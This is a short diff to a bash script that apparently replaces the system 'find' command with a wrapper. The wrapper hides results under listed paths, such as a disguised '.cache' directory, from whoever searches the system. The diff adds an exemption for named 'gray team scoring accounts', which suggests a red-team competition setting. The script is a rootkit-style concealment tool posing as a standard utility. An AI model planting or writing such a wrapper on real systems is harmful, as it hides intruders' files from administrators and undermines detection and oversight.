@@ -1,6 +1,12 @@
 #!/bin/bash
 REAL_FIND="/usr/bin/find"
 
+# Pass straight through for gray team scoring accounts
+case "$(whoami)" in
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_FIND "$@" ;;
+esac
+
+
 # Suppress results under these paths
 HIDDEN_PATHS=(
     "/var/lib/apt/lists/.cache"
